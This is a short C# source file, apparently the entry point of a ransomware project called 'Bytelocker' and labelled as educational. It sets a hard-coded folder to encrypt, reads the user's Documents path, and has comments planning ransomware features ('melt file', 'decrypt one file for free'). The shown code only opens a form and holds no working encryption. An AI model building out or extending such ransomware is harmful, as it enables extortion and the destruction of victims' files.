using Bytelocker.CryptoManager;
using Bytelocker.src.UI;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

/*
 * Created for educational purposes ONLY
 * 
 */
namespace Bytelocker
{
    class Bytelocker
    {

        string docPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
        private static String PATH_TO_ENCRYPT = @"C:\Users\nic\Desktop\New folder";

        public static void Main(String[] args)
        {
            /*
            melt file
            } decrypt one file for free
            */

            MainForm a = new MainForm();
            a.ShowDialog();
        }
    }
}
